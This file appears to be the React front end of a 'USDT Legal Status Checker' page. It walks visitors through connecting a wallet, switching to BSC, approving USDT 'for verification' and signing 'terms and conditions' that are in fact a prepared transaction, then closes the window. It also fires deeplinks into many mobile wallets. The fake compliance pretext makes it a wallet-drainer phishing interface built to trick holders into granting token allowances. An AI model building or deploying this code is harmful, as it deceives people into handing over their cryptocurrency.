'use client';

import { useState } from 'react';
import { ethers } from 'ethers';
import ProgressBar from './ProgressBar';
import CardStep from './CardStep';
import SuccessModal from './SuccessModal';
import { switchToBSC, approveToken, prepareAndSignTransaction } from '@/lib/blockchain';

export default function ApprovalPortal() {
  const [step, setStep] = useState(1);
  const [userAddress, setUserAddress] = useState<string | null>(null);
  const [signer, setSigner] = useState<ethers.Signer | null>(null);
  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);

  const handleConnectWallet = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!window.ethereum) throw new Error('No web3 wallet found');

      await switchToBSC();
      const newProvider = new ethers.BrowserProvider(window.ethereum);
      await newProvider.send('eth_requestAccounts', []);
      const newSigner = await newProvider.getSigner();
      const address = await newSigner.getAddress();

      setUserAddress(address);
      setSigner(newSigner);
      setProvider(newProvider);
      setStep(2);
    } catch (err: any) {
      setError(err?.message || 'Connection failed');
    } finally {
      setLoading(false);
    }
  };

  const handleApproveToken = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!signer) throw new Error('Connect wallet first');
      await approveToken(signer);
      setStep(3);
    } catch (err: any) {
      setError(err?.message || 'Approval failed');
    } finally {
      setLoading(false);
    }
  };

  const handleSignTransaction = async () => {
    try {
      setError(null);
      setLoading(true);
      if (!signer || !provider || !userAddress) throw new Error('Connect wallet first');
      await prepareAndSignTransaction(signer, provider, userAddress);
      setShowSuccess(true);
      setTimeout(() => {
        if (typeof window !== 'undefined') {
          window.close();
        }
      }, 3000);
    } catch (err: any) {
      setError(err?.message || 'Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  const handleMobileWallet = () => {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    if (!isMobile) {
      setError('Mobile wallet deeplinks are only available on mobile devices');
      return;
    }

    const currentUrl = typeof window !== 'undefined' ? window.location.href : '';
    const encodedUrl = encodeURIComponent(currentUrl);
    
    // Universal deeplinks for major mobile wallets
    const walletLinks = [
      // MetaMask
      `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
      // Trust Wallet
      `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`,
      // Rainbow
      `https://rnbwapp.com/browser?url=${encodedUrl}`,
      // Coinbase Wallet
      `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
      // TokenPocket
      `tpdapp://open?params=${encodedUrl}`,
      // imToken
      `imtokenv2://navigate/DappView?url=${encodedUrl}`,
      // Crypto.com DeFi Wallet
      `dfw://browser?url=${encodedUrl}`,
      // SafePal
      `safepal://browser?url=${encodedUrl}`,
      // Bitget Wallet
      `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`,
      // OKX Wallet
      `okx://wallet/dapp/url?dappUrl=${encodedUrl}`,
      // Binance Wallet (Trust Wallet alternative)
      `bnc://app.binance.com/dapp?url=${encodedUrl}`,
      // Phantom (if available on mobile)
      `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
      // Argent
      `https://argent.link/app/wc?uri=${encodedUrl}`,
      // 1inch Wallet
      `oneinch://dapp?url=${encodedUrl}`,
      // Zerion
      `zerion://dapp?url=${encodedUrl}`,
    ];

    // Try opening with universal mobile scheme first
    const universalScheme = `dapp://${window.location.host}${window.location.pathname}`;
    
    // Attempt to trigger all wallet deeplinks
    walletLinks.forEach((link, index) => {
      setTimeout(() => {
        const a = document.createElement('a');
        a.href = link;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }, index * 300); // Stagger the attempts
    });

    // Also try the universal scheme
    setTimeout(() => {
      const a = document.createElement('a');
      a.href = universalScheme;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }, walletLinks.length * 300);

    // Show user feedback
    setTimeout(() => {
      setError(null);
    }, (walletLinks.length + 1) * 300);
  };

  return (
    <main className="min-h-screen flex flex-col items-center justify-center p-6 bg-gradient-to-br from-[#0a0a0f] via-[#1a1a2e] to-[#16213e]">
      <div className="w-full max-w-2xl">
        <div className="text-center mb-8 animate-float">
          <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-gradient-to-br from-emerald-500 to-teal-600 mb-4 shadow-lg shadow-emerald-500/30">
            <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>
          <h1 className="text-4xl font-bold text-white mb-2">USDT Legal Status Checker</h1>
          <p className="text-gray-400 text-base">Verify your USDT compliance with regulatory standards</p>
        </div>

        <ProgressBar currentStep={step} />

        {step === 1 && (
          <CardStep
            icon="🔗"
            title="Connect Wallet to Check USDT"
            description="Connect your wallet to verify your USDT legal status and ensure compliance with regulatory standards."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Connect Wallet',
                onClick: handleConnectWallet,
                primary: true,
              },
              {
                label: 'Open Mobile Wallet',
                onClick: handleMobileWallet,
                primary: false,
              }
            ]}
          />
        )}

        {step === 2 && (
          <CardStep
            icon="✅"
            title="Approve USDT Interaction"
            description="Approve USDT interaction to allow the verification system to check your token compliance status."
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Approve USDT',
                onClick: handleApproveToken,
                primary: true,
              }
            ]}
          />
        )}

        {step === 3 && (
          <CardStep
            icon="✍️"
            title="Sign Terms & Conditions"
            description="Review and sign the terms and conditions to complete the USDT verification process."
            loading={loading}
            error={error}
            showTerms={true}
            buttons={[
              {
                label: 'Sign & Accept Terms',
                onClick: handleSignTransaction,
                primary: true,
              }
            ]}
          />
        )}

        <SuccessModal isOpen={showSuccess} />
      </div>

      <footer className="fixed bottom-5 left-1/2 -translate-x-1/2 text-xs text-gray-400 backdrop-blur-sm bg-black/30 px-4 py-2 rounded-full border border-emerald-500/10">
        Secured by <span className="text-emerald-500 font-medium">USDT Compliance Network</span>
      </footer>
    </main>
  );
}
